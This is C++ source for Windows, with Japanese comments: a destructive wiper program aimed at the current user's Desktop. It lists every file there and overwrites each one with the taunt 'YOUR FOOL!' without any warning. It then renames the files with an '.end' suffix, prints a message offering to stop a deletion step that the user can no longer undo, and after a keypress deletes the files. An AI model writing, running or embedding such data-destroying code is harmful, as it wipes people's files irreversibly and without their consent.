#include <iostream>
#include <filesystem>
#include <vector>
#include <string>
#include <fstream>//ファイル書き換えに使用
#include <lmcons.h>//ユーザーネーム返還に使用
#include <shlwapi.h>//ユーザーネームに使用

struct findfiles {
	std::filesystem::path start = ".";
	/*find_now()関数を使用する際探す*/
	std::vector<std::filesystem::path> foundfiles;
	std::vector<std::filesystem::path> directorys;
	int find_now() {
		try {
			std::filesystem::recursive_directory_iterator end;
			std::filesystem::recursive_directory_iterator find(start);
			for (; find != end; find++) {		
				if ((*find).is_directory()) {
					directorys.push_back(*find);
				}
				else {
					foundfiles.push_back(*find);
				}
			}
		}catch (std::filesystem::filesystem_error e) {return -1;}
		return 0;
	}
	void say() {
		for (unsigned int i = 0; i < foundfiles.size();i++) {
			std::cout << i<<":"<<foundfiles[i]<<std::endl;
		}
		std::cout << std::endl << "directory:"<<std::endl;
		for (unsigned int i = 0; i < directorys.size(); i++) {
			std::cout << directorys[i] << std::endl;
		}
	}
	std::string getpath() {
		std::string d = foundfiles[0].u8string();
		return d;
	}
	findfiles(std::filesystem::path test="."){
		start = test;
	}
};
std::string username() {
	TCHAR username[UNLEN + 1];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);
	std::wstring wStr = username;
	return std::string(wStr.begin(), wStr.end());
}
void plusend(findfiles* one){
	for (int i = 0; i < (*one).foundfiles.size(); i++) {
		std::filesystem::path from = (*one).foundfiles[i];
		from += (std::filesystem::path)".end";
		std::filesystem::rename((*one).foundfiles[i], from);
	}
}
void chenge(findfiles* one) {
	for (int i = 0; i < (*one).foundfiles.size();i++) {
		std::ofstream ofs((*one).foundfiles[i]);
		std::string x="YOUR FOOL!\r\nYOUR FOOL!\r\nYOUR FOOL!\r\nYOUR FOOL!";
		ofs << x;
		ofs.close();
	}
}
void remove_s(findfiles* one) {
	try {
		std::filesystem::recursive_directory_iterator end;
		std::filesystem::recursive_directory_iterator find((*one).start);
		for (; find != end; find++) {
			if (!(*find).is_directory()) {
				std::filesystem::remove(std::filesystem::absolute(*find));
			}
		}
	}
	catch (std::filesystem::filesystem_error e) {}
}
int main(void)
{
	std::string name= username();
	findfiles one=(std::filesystem::path)("c:\\users\\"+name+"\\desktop\\");
	one.find_now();
	one.say();
	chenge(&one);
	one.say();
	//chenge(&one);
	plusend(&one);
	std::cout << std::endl << "これらのデータをすべて書き換えました。\r\n消去シーケンスを実行します。\r\n実行したくない場合はそのまま閉じてください。" << std::endl;
	_getwch();
	remove_s(&one);
	return 0;
}